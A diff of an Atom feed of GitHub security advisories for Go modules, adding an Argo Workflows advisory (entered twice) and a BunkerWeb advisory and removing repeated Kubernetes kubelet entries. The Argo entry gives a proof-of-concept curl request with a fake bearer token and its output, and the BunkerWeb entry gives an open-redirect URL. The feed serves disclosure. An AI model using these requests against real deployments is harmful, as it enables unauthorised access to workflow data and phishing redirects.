@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://azu.github.io/github-advisory-database-rss/go.rss</id>
     <title>Security Advisory for Go modules</title>
-    <updated>2024-12-02T22:01:27.092Z</updated>
+    <updated>2024-12-02T23:01:25.737Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago"/>
     <subtitle>Security Advisory for Go modules on GitHub</subtitle>
@@ -11,6 +11,482 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[github.com/argoproj/argo-workflows/v3] Access to Archived Argo Workflows with Fake Token in `client` mode]]></title>
+        <id>https://github.com/advisories/GHSA-h36c-m3rf-34h9</id>
+        <link href="https://github.com/advisories/GHSA-h36c-m3rf-34h9"/>
+        <updated>2024-12-02T22:17:56.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>When using <code>--auth-mode=client</code>, Archived Workflows can be retrieved with a fake or spoofed token via the GET Workflow endpoint: <code>/api/v1/workflows/{namespace}/{name}</code></p>
+<p>When using <code>--auth-mode=sso</code>,  all Archived Workflows can be retrieved with a valid token via the GET Workflow endpoint: <code>/api/v1/workflows/{namespace}/{name}</code></p>
+<h3 id="details">Details</h3>
+<p>No authentication is performed by the Server itself on <code>client</code> tokens[^1]. Authentication &amp; authorization is instead delegated to the k8s API server.
+However, the <a href="https://github.com/argoproj/argo-workflows/blob/52cca7e079a4f6d76db303ac550b1876e51b3865/server/workflowarchive/archived_workflow_server.go">Workflow Archive</a> does not interact with k8s, and so any token that <a href="https://github.com/argoproj/argo-workflows/blob/52cca7e079a4f6d76db303ac550b1876e51b3865/server/auth/mode.go#L37"><em>looks</em></a> <a href="https://github.com/argoproj/argo-workflows/blob/52cca7e079a4f6d76db303ac550b1876e51b3865/server/auth/gatekeeper.go#L185">valid</a> will be considered authenticated, even if it is not a k8s token or even if the token has no RBAC for Argo. To handle the lack of pass-through k8s authN/authZ, the Workflow Archive specifically does <a href="https://github.com/argoproj/argo-workflows/blob/52cca7e079a4f6d76db303ac550b1876e51b3865/server/workflowarchive/archived_workflow_server.go#L50">the equivalent of a <code>kubectl auth can-i</code></a> check for respective methods.</p>
+<p>In #12736 / v3.5.7 and #13021 / v3.5.8, the auth check was accidentally removed on the GET Workflow endpoint's fallback to archived workflows on <a href="https://github.com/argoproj/argo-workflows/pull/13021/files#diff-a5b255abaceddc9cc20bf6da6ae92c3a5d3605d94366af503ed754c079a1171aL668-R715">these lines</a>, allowing archived workflows to be retrieved with a fake token.</p>
+<h3 id="poc">PoC</h3>
+<h4 id="configuration">Configuration</h4>
+<p>Controller <code>ConfigMap</code>:</p>
+<pre><code class="language-yaml">  config: |
+    persistence:
+      archive: true
+      postgresql:
+        database: argoworkflows
+        host: db-host
+        passwordSecret:
+          key: postgresPassword
+          name: argo-wf-postgres-credentials
+        port: 5432
+        tableName: argo_workflows
+        userNameSecret:
+          key: username
+          name: argo-wf-postgres-credentials
+</code></pre>
+<p>Server: <code>--auth-mode=client</code></p>
+<h4 id="reproduction">Reproduction</h4>
+<p>Visit a completed, archived workflow URL with an invalid authorization token, this results in the workflow being displayed.</p>
+<p>For example, directly query the API and retrieve the workflow data (where <code>Bearer thisisatest</code> is not a valid token):</p>
+<pre><code class="language-sh">curl -H 'Authorization: Bearer thisisatest' -v http://localhost:8000/api/v1/workflows/argo/hello-world-7tv5g
+</code></pre>
+<details><summary>Results in a returned workflow:</summary>
+
+<pre><code>* Host localhost:8000 was resolved.
+* IPv6: ::1
+* IPv4: 127.0.0.1
+*   Trying [::1]:8000...
+* Connected to localhost (::1) port 8000
+&gt; GET /api/v1/workflows/argo/hello-world-7tv5g HTTP/1.1
+&gt; Host: localhost:8000
+&gt; User-Agent: curl/8.7.1
+&gt; Accept: */*
+&gt; Authorization: Bearer thisisatest
+&gt;
+* Request completely sent off
+&lt; HTTP/1.1 200 OK
+&lt; Content-Type: application/json
+&lt; Grpc-Metadata-Content-Type: application/grpc
+&lt; X-Ratelimit-Limit: 1000
+&lt; X-Ratelimit-Remaining: 999
+&lt; X-Ratelimit-Reset: Mon, 19 Aug 2024 20:44:27 UTC
+&lt; Date: Mon, 19 Aug 2024 20:44:26 GMT
+&lt; Transfer-Encoding: chunked
+&lt;
+* Connection #0 to host localhost left intact
+{
+    "metadata": {
+        "name": "hello-world-7tv5g",
+        "generateName": "hello-world-",
+        "namespace": "argo",
+        "uid": "e5868ab1-f820-4a9e-9407-162346a4ccb4",
+        "resourceVersion": "9982",
+        "generation": 3,
+        "creationTimestamp": "2024-08-13T23:59:20Z",
+        "labels": {
+            "workflows.argoproj.io/archive-strategy": "false",
+            "workflows.argoproj.io/completed": "true",
+            "workflows.argoproj.io/phase": "Succeeded",
+            "workflows.argoproj.io/workflow-archiving-status": "Persisted"
+        },
+        "annotations": {
+            "workflows.argoproj.io/description": "This is a simple hello world example.\n",
+            "workflows.argoproj.io/pod-name-format": "v2"
+        },
+        "managedFields": [
+            {
+                "manager": "argo",
+                "operation": "Update",
+                "apiVersion": "argoproj.io/v1alpha1",
+                "time": "2024-08-13T23:59:20Z",
+                "fieldsType": "FieldsV1",
+                "fieldsV1": {
+                    "f:metadata": {
+                        "f:annotations": {
+                            ".": {},
+                            "f:workflows.argoproj.io/description": {}
+                        },
+                        "f:generateName": {},
+                        "f:labels": {
+                            ".": {},
+                            "f:workflows.argoproj.io/archive-strategy": {}
+                        }
+                    },
+                    "f:spec": {}
+                }
+            },
+            {
+                "manager": "workflow-controller",
+                "operation": "Update",
+                "apiVersion": "argoproj.io/v1alpha1",
+                "time": "2024-08-13T23:59:30Z",
+                "fieldsType": "FieldsV1",
+                "fieldsV1": {
+                    "f:metadata": {
+                        "f:annotations": {
+                            "f:workflows.argoproj.io/pod-name-format": {}
+                        },
+                        "f:labels": {
+                            "f:workflows.argoproj.io/completed": {},
+                            "f:workflows.argoproj.io/phase": {},
+                            "f:workflows.argoproj.io/workflow-archiving-status": {}
+                        }
+                    },
+                    "f:status": {}
+                }
+            }
+        ]
+    },
+    "spec": {
+        "templates": [
+            {
+                "name": "hello-world",
+                "inputs": {},
+                "outputs": {},
+                "metadata": {},
+                "container": {
+                    "name": "",
+                    "image": "busybox",
+                    "command": [
+                        "echo"
+                    ],
+                    "args": [
+                        "hello world"
+                    ],
+                    "resources": {}
+                }
+            }
+        ],
+        "entrypoint": "hello-world",
+        "arguments": {},
+        "serviceAccountName": "argo-workflow"
+    },
+    "status": {
+        "phase": "Succeeded",
+        "startedAt": "2024-08-13T23:59:20Z",
+        "finishedAt": "2024-08-13T23:59:30Z",
+        "progress": "1/1",
+        "nodes": {
+            "hello-world-7tv5g": {
+                "id": "hello-world-7tv5g",
+                "name": "hello-world-7tv5g",
+                "displayName": "hello-world-7tv5g",
+                "type": "Pod",
+                "templateName": "hello-world",
+                "templateScope": "local/hello-world-7tv5g",
+                "phase": "Succeeded",
+                "startedAt": "2024-08-13T23:59:20Z",
+                "finishedAt": "2024-08-13T23:59:24Z",
+                "progress": "1/1",
+                "resourcesDuration": {
+                    "cpu": 0,
+                    "memory": 3
+                },
+                "outputs": {
+                    "exitCode": "0"
+                },
+                "hostNodeName": "kind-control-plane"
+            }
+        },
+        "conditions": [
+            {
+                "type": "PodRunning",
+                "status": "False"
+            },
+            {
+                "type": "Completed",
+                "status": "True"
+            }
+        ],
+        "resourcesDuration": {
+            "cpu": 0,
+            "memory": 3
+        },
+        "artifactRepositoryRef": {
+            "default": true,
+            "artifactRepository": {}
+        },
+        "artifactGCStatus": {
+            "notSpecified": true
+        },
+        "taskResultsCompletionStatus": {
+            "hello-world-7tv5g": true
+        }
+    }
+}%
+</code></pre>
+</details>
+
+
+<h3 id="impact">Impact</h3>
+<p>Users of the Server with <code>--auth-mode=client</code> and with <code>persistence.archive: true</code> are vulnerable to having Archived Workflows retrieved with a fake or spoofed token.</p>
+<p>Users of the Server with <code>--auth-mode=sso</code> and with <code>persistence.archive: true</code> are vulnerable to users being able to access workflows they could not access before archiving.</p>
+<p>[^1]: <code>sso</code> tokens, on the other hand, are <a href="https://github.com/argoproj/argo-workflows/blob/52cca7e079a4f6d76db303ac550b1876e51b3865/server/auth/gatekeeper.go#L207">immediately "authorized"</a>. The naming in the codebase is a bit confusing; it would be more appropriate to say "authenticated" in this case, as authorization is via SSO RBAC / SA matching / k8s API server. In this same section of the codebase, the <code>client</code> tokens are not authenticated, they are only validated. Authentication and authorization is done simultaneously for <code>client</code> tokens via the k8s API server.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/argoproj/argo-workflows/security/advisories/GHSA-h36c-m3rf-34h9">https://github.com/argoproj/argo-workflows/security/advisories/GHSA-h36c-m3rf-34h9</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-53862">https://nvd.nist.gov/vuln/detail/CVE-2024-53862</a></li>
+<li><a href="https://github.com/argoproj/argo-workflows/pull/13021/files#diff-a5b255abaceddc9cc20bf6da6ae92c3a5d3605d94366af503ed754c079a1171aL668-R715">https://github.com/argoproj/argo-workflows/pull/13021/files#diff-a5b255abaceddc9cc20bf6da6ae92c3a5d3605d94366af503ed754c079a1171aL668-R715</a></li>
+<li><a href="https://github.com/advisories/GHSA-h36c-m3rf-34h9">https://github.com/advisories/GHSA-h36c-m3rf-34h9</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-h36c-m3rf-34h9</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2024-12-02T22:17:55.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[github.com/argoproj/argo-workflows/v3] Access to Archived Argo Workflows with Fake Token in `client` mode]]></title>
+        <id>https://github.com/advisories/GHSA-h36c-m3rf-34h9</id>
+        <link href="https://github.com/advisories/GHSA-h36c-m3rf-34h9"/>
+        <updated>2024-12-02T22:17:56.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>When using <code>--auth-mode=client</code>, Archived Workflows can be retrieved with a fake or spoofed token via the GET Workflow endpoint: <code>/api/v1/workflows/{namespace}/{name}</code></p>
+<p>When using <code>--auth-mode=sso</code>,  all Archived Workflows can be retrieved with a valid token via the GET Workflow endpoint: <code>/api/v1/workflows/{namespace}/{name}</code></p>
+<h3 id="details">Details</h3>
+<p>No authentication is performed by the Server itself on <code>client</code> tokens[^1]. Authentication &amp; authorization is instead delegated to the k8s API server.
+However, the <a href="https://github.com/argoproj/argo-workflows/blob/52cca7e079a4f6d76db303ac550b1876e51b3865/server/workflowarchive/archived_workflow_server.go">Workflow Archive</a> does not interact with k8s, and so any token that <a href="https://github.com/argoproj/argo-workflows/blob/52cca7e079a4f6d76db303ac550b1876e51b3865/server/auth/mode.go#L37"><em>looks</em></a> <a href="https://github.com/argoproj/argo-workflows/blob/52cca7e079a4f6d76db303ac550b1876e51b3865/server/auth/gatekeeper.go#L185">valid</a> will be considered authenticated, even if it is not a k8s token or even if the token has no RBAC for Argo. To handle the lack of pass-through k8s authN/authZ, the Workflow Archive specifically does <a href="https://github.com/argoproj/argo-workflows/blob/52cca7e079a4f6d76db303ac550b1876e51b3865/server/workflowarchive/archived_workflow_server.go#L50">the equivalent of a <code>kubectl auth can-i</code></a> check for respective methods.</p>
+<p>In #12736 / v3.5.7 and #13021 / v3.5.8, the auth check was accidentally removed on the GET Workflow endpoint's fallback to archived workflows on <a href="https://github.com/argoproj/argo-workflows/pull/13021/files#diff-a5b255abaceddc9cc20bf6da6ae92c3a5d3605d94366af503ed754c079a1171aL668-R715">these lines</a>, allowing archived workflows to be retrieved with a fake token.</p>
+<h3 id="poc">PoC</h3>
+<h4 id="configuration">Configuration</h4>
+<p>Controller <code>ConfigMap</code>:</p>
+<pre><code class="language-yaml">  config: |
+    persistence:
+      archive: true
+      postgresql:
+        database: argoworkflows
+        host: db-host
+        passwordSecret:
+          key: postgresPassword
+          name: argo-wf-postgres-credentials
+        port: 5432
+        tableName: argo_workflows
+        userNameSecret:
+          key: username
+          name: argo-wf-postgres-credentials
+</code></pre>
+<p>Server: <code>--auth-mode=client</code></p>
+<h4 id="reproduction">Reproduction</h4>
+<p>Visit a completed, archived workflow URL with an invalid authorization token, this results in the workflow being displayed.</p>
+<p>For example, directly query the API and retrieve the workflow data (where <code>Bearer thisisatest</code> is not a valid token):</p>
+<pre><code class="language-sh">curl -H 'Authorization: Bearer thisisatest' -v http://localhost:8000/api/v1/workflows/argo/hello-world-7tv5g
+</code></pre>
+<details><summary>Results in a returned workflow:</summary>
+
+<pre><code>* Host localhost:8000 was resolved.
+* IPv6: ::1
+* IPv4: 127.0.0.1
+*   Trying [::1]:8000...
+* Connected to localhost (::1) port 8000
+&gt; GET /api/v1/workflows/argo/hello-world-7tv5g HTTP/1.1
+&gt; Host: localhost:8000
+&gt; User-Agent: curl/8.7.1
+&gt; Accept: */*
+&gt; Authorization: Bearer thisisatest
+&gt;
+* Request completely sent off
+&lt; HTTP/1.1 200 OK
+&lt; Content-Type: application/json
+&lt; Grpc-Metadata-Content-Type: application/grpc
+&lt; X-Ratelimit-Limit: 1000
+&lt; X-Ratelimit-Remaining: 999
+&lt; X-Ratelimit-Reset: Mon, 19 Aug 2024 20:44:27 UTC
+&lt; Date: Mon, 19 Aug 2024 20:44:26 GMT
+&lt; Transfer-Encoding: chunked
+&lt;
+* Connection #0 to host localhost left intact
+{
+    "metadata": {
+        "name": "hello-world-7tv5g",
+        "generateName": "hello-world-",
+        "namespace": "argo",
+        "uid": "e5868ab1-f820-4a9e-9407-162346a4ccb4",
+        "resourceVersion": "9982",
+        "generation": 3,
+        "creationTimestamp": "2024-08-13T23:59:20Z",
+        "labels": {
+            "workflows.argoproj.io/archive-strategy": "false",
+            "workflows.argoproj.io/completed": "true",
+            "workflows.argoproj.io/phase": "Succeeded",
+            "workflows.argoproj.io/workflow-archiving-status": "Persisted"
+        },
+        "annotations": {
+            "workflows.argoproj.io/description": "This is a simple hello world example.\n",
+            "workflows.argoproj.io/pod-name-format": "v2"
+        },
+        "managedFields": [
+            {
+                "manager": "argo",
+                "operation": "Update",
+                "apiVersion": "argoproj.io/v1alpha1",
+                "time": "2024-08-13T23:59:20Z",
+                "fieldsType": "FieldsV1",
+                "fieldsV1": {
+                    "f:metadata": {
+                        "f:annotations": {
+                            ".": {},
+                            "f:workflows.argoproj.io/description": {}
+                        },
+                        "f:generateName": {},
+                        "f:labels": {
+                            ".": {},
+                            "f:workflows.argoproj.io/archive-strategy": {}
+                        }
+                    },
+                    "f:spec": {}
+                }
+            },
+            {
+                "manager": "workflow-controller",
+                "operation": "Update",
+                "apiVersion": "argoproj.io/v1alpha1",
+                "time": "2024-08-13T23:59:30Z",
+                "fieldsType": "FieldsV1",
+                "fieldsV1": {
+                    "f:metadata": {
+                        "f:annotations": {
+                            "f:workflows.argoproj.io/pod-name-format": {}
+                        },
+                        "f:labels": {
+                            "f:workflows.argoproj.io/completed": {},
+                            "f:workflows.argoproj.io/phase": {},
+                            "f:workflows.argoproj.io/workflow-archiving-status": {}
+                        }
+                    },
+                    "f:status": {}
+                }
+            }
+        ]
+    },
+    "spec": {
+        "templates": [
+            {
+                "name": "hello-world",
+                "inputs": {},
+                "outputs": {},
+                "metadata": {},
+                "container": {
+                    "name": "",
+                    "image": "busybox",
+                    "command": [
+                        "echo"
+                    ],
+                    "args": [
+                        "hello world"
+                    ],
+                    "resources": {}
+                }
+            }
+        ],
+        "entrypoint": "hello-world",
+        "arguments": {},
+        "serviceAccountName": "argo-workflow"
+    },
+    "status": {
+        "phase": "Succeeded",
+        "startedAt": "2024-08-13T23:59:20Z",
+        "finishedAt": "2024-08-13T23:59:30Z",
+        "progress": "1/1",
+        "nodes": {
+            "hello-world-7tv5g": {
+                "id": "hello-world-7tv5g",
+                "name": "hello-world-7tv5g",
+                "displayName": "hello-world-7tv5g",
+                "type": "Pod",
+                "templateName": "hello-world",
+                "templateScope": "local/hello-world-7tv5g",
+                "phase": "Succeeded",
+                "startedAt": "2024-08-13T23:59:20Z",
+                "finishedAt": "2024-08-13T23:59:24Z",
+                "progress": "1/1",
+                "resourcesDuration": {
+                    "cpu": 0,
+                    "memory": 3
+                },
+                "outputs": {
+                    "exitCode": "0"
+                },
+                "hostNodeName": "kind-control-plane"
+            }
+        },
+        "conditions": [
+            {
+                "type": "PodRunning",
+                "status": "False"
+            },
+            {
+                "type": "Completed",
+                "status": "True"
+            }
+        ],
+        "resourcesDuration": {
+            "cpu": 0,
+            "memory": 3
+        },
+        "artifactRepositoryRef": {
+            "default": true,
+            "artifactRepository": {}
+        },
+        "artifactGCStatus": {
+            "notSpecified": true
+        },
+        "taskResultsCompletionStatus": {
+            "hello-world-7tv5g": true
+        }
+    }
+}%
+</code></pre>
+</details>
+
+
+<h3 id="impact">Impact</h3>
+<p>Users of the Server with <code>--auth-mode=client</code> and with <code>persistence.archive: true</code> are vulnerable to having Archived Workflows retrieved with a fake or spoofed token.</p>
+<p>Users of the Server with <code>--auth-mode=sso</code> and with <code>persistence.archive: true</code> are vulnerable to users being able to access workflows they could not access before archiving.</p>
+<p>[^1]: <code>sso</code> tokens, on the other hand, are <a href="https://github.com/argoproj/argo-workflows/blob/52cca7e079a4f6d76db303ac550b1876e51b3865/server/auth/gatekeeper.go#L207">immediately "authorized"</a>. The naming in the codebase is a bit confusing; it would be more appropriate to say "authenticated" in this case, as authorization is via SSO RBAC / SA matching / k8s API server. In this same section of the codebase, the <code>client</code> tokens are not authenticated, they are only validated. Authentication and authorization is done simultaneously for <code>client</code> tokens via the k8s API server.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/argoproj/argo-workflows/security/advisories/GHSA-h36c-m3rf-34h9">https://github.com/argoproj/argo-workflows/security/advisories/GHSA-h36c-m3rf-34h9</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-53862">https://nvd.nist.gov/vuln/detail/CVE-2024-53862</a></li>
+<li><a href="https://github.com/argoproj/argo-workflows/pull/13021/files#diff-a5b255abaceddc9cc20bf6da6ae92c3a5d3605d94366af503ed754c079a1171aL668-R715">https://github.com/argoproj/argo-workflows/pull/13021/files#diff-a5b255abaceddc9cc20bf6da6ae92c3a5d3605d94366af503ed754c079a1171aL668-R715</a></li>
+<li><a href="https://github.com/advisories/GHSA-h36c-m3rf-34h9">https://github.com/advisories/GHSA-h36c-m3rf-34h9</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-h36c-m3rf-34h9</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2024-12-02T22:17:55.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[github.com/bunkerity/bunkerweb] BunkerWeb has Open Redirect Vulnerability in Loading Page]]></title>
+        <id>https://github.com/advisories/GHSA-q9rr-h3hx-m87g</id>
+        <link href="https://github.com/advisories/GHSA-q9rr-h3hx-m87g"/>
+        <updated>2024-12-02T22:17:20.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary:</h3>
+<p>A open redirect vulnerability exists in the loading endpoint, allowing attackers to redirect authenticated users to arbitrary external URLs via the "next" parameter.</p>
+<h3 id="details">Details:</h3>
+<p>The loading endpoint accepts and uses an unvalidated "next" parameter for redirects:</p>
+<h3 id="poc">PoC:</h3>
+<p>Visit: <code>/loading?next=https://google.com</code> while authenticated. The page will redirect to google.com.</p>
+<h3 id="impact">Impact:</h3>
+<p>This vulnerability could be used in phishing attacks by redirecting users from a legitimate application URL to malicious sites.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/bunkerity/bunkerweb/security/advisories/GHSA-q9rr-h3hx-m87g">https://github.com/bunkerity/bunkerweb/security/advisories/GHSA-q9rr-h3hx-m87g</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-53264">https://nvd.nist.gov/vuln/detail/CVE-2024-53264</a></li>
+<li><a href="https://github.com/advisories/GHSA-q9rr-h3hx-m87g">https://github.com/advisories/GHSA-q9rr-h3hx-m87g</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-q9rr-h3hx-m87g</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2024-12-02T22:17:18.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[github.com/moby/moby] Moby Race Condition vulnerability]]></title>
         <id>https://github.com/advisories/GHSA-gh5c-3h97-2f3q</id>
@@ -701,77 +1177,5 @@ Service account can also be configured via helm <a href="https://github.com/kani
         </author>
         <category label="severity" term="MODERATE"/>
         <published>2024-08-20T22:13:02.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[k8s.io/kubernetes]  Kubernetes kubelet arbitrary command execution]]></title>
-        <id>https://github.com/advisories/GHSA-27wf-5967-98gx</id>
-        <link href="https://github.com/advisories/GHSA-27wf-5967-98gx"/>
-        <updated>2024-11-27T21:57:08.000Z</updated>
-        <content type="html"><![CDATA[<p>The Kubernetes kubelet component allows arbitrary command execution via specially crafted gitRepo volumes.This issue affects kubelet: through 1.28.11, from 1.29.0 through 1.29.6, from 1.30.0 through 1.30.2.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-10220">https://nvd.nist.gov/vuln/detail/CVE-2024-10220</a></li>
-<li><a href="https://github.com/kubernetes/kubernetes/issues/128885">https://github.com/kubernetes/kubernetes/issues/128885</a></li>
-<li><a href="https://groups.google.com/g/kubernetes-security-announce/c/ptNgV5Necko">https://groups.google.com/g/kubernetes-security-announce/c/ptNgV5Necko</a></li>
-<li><a href="http://www.openwall.com/lists/oss-security/2024/11/20/1">http://www.openwall.com/lists/oss-security/2024/11/20/1</a></li>
-<li><a href="https://github.com/kubernetes/kubernetes/commit/1ab06efe92d8e898ca1931471c9533ce94aba29b">https://github.com/kubernetes/kubernetes/commit/1ab06efe92d8e898ca1931471c9533ce94aba29b</a></li>
-<li><a href="https://github.com/advisories/GHSA-27wf-5967-98gx">https://github.com/advisories/GHSA-27wf-5967-98gx</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-27wf-5967-98gx</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2024-11-22T21:32:15.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[k8s.io/kubernetes]  Kubernetes kubelet arbitrary command execution]]></title>
-        <id>https://github.com/advisories/GHSA-27wf-5967-98gx</id>
-        <link href="https://github.com/advisories/GHSA-27wf-5967-98gx"/>
-        <updated>2024-11-27T21:57:08.000Z</updated>
-        <content type="html"><![CDATA[<p>The Kubernetes kubelet component allows arbitrary command execution via specially crafted gitRepo volumes.This issue affects kubelet: through 1.28.11, from 1.29.0 through 1.29.6, from 1.30.0 through 1.30.2.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-10220">https://nvd.nist.gov/vuln/detail/CVE-2024-10220</a></li>
-<li><a href="https://github.com/kubernetes/kubernetes/issues/128885">https://github.com/kubernetes/kubernetes/issues/128885</a></li>
-<li><a href="https://groups.google.com/g/kubernetes-security-announce/c/ptNgV5Necko">https://groups.google.com/g/kubernetes-security-announce/c/ptNgV5Necko</a></li>
-<li><a href="http://www.openwall.com/lists/oss-security/2024/11/20/1">http://www.openwall.com/lists/oss-security/2024/11/20/1</a></li>
-<li><a href="https://github.com/kubernetes/kubernetes/commit/1ab06efe92d8e898ca1931471c9533ce94aba29b">https://github.com/kubernetes/kubernetes/commit/1ab06efe92d8e898ca1931471c9533ce94aba29b</a></li>
-<li><a href="https://github.com/advisories/GHSA-27wf-5967-98gx">https://github.com/advisories/GHSA-27wf-5967-98gx</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-27wf-5967-98gx</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2024-11-22T21:32:15.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[k8s.io/kubernetes]  Kubernetes kubelet arbitrary command execution]]></title>
-        <id>https://github.com/advisories/GHSA-27wf-5967-98gx</id>
-        <link href="https://github.com/advisories/GHSA-27wf-5967-98gx"/>
-        <updated>2024-11-27T21:57:08.000Z</updated>
-        <content type="html"><![CDATA[<p>The Kubernetes kubelet component allows arbitrary command execution via specially crafted gitRepo volumes.This issue affects kubelet: through 1.28.11, from 1.29.0 through 1.29.6, from 1.30.0 through 1.30.2.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-10220">https://nvd.nist.gov/vuln/detail/CVE-2024-10220</a></li>
-<li><a href="https://github.com/kubernetes/kubernetes/issues/128885">https://github.com/kubernetes/kubernetes/issues/128885</a></li>
-<li><a href="https://groups.google.com/g/kubernetes-security-announce/c/ptNgV5Necko">https://groups.google.com/g/kubernetes-security-announce/c/ptNgV5Necko</a></li>
-<li><a href="http://www.openwall.com/lists/oss-security/2024/11/20/1">http://www.openwall.com/lists/oss-security/2024/11/20/1</a></li>
-<li><a href="https://github.com/kubernetes/kubernetes/commit/1ab06efe92d8e898ca1931471c9533ce94aba29b">https://github.com/kubernetes/kubernetes/commit/1ab06efe92d8e898ca1931471c9533ce94aba29b</a></li>
-<li><a href="https://github.com/advisories/GHSA-27wf-5967-98gx">https://github.com/advisories/GHSA-27wf-5967-98gx</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-27wf-5967-98gx</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2024-11-22T21:32:15.000Z</published>
     </entry>
 </feed>
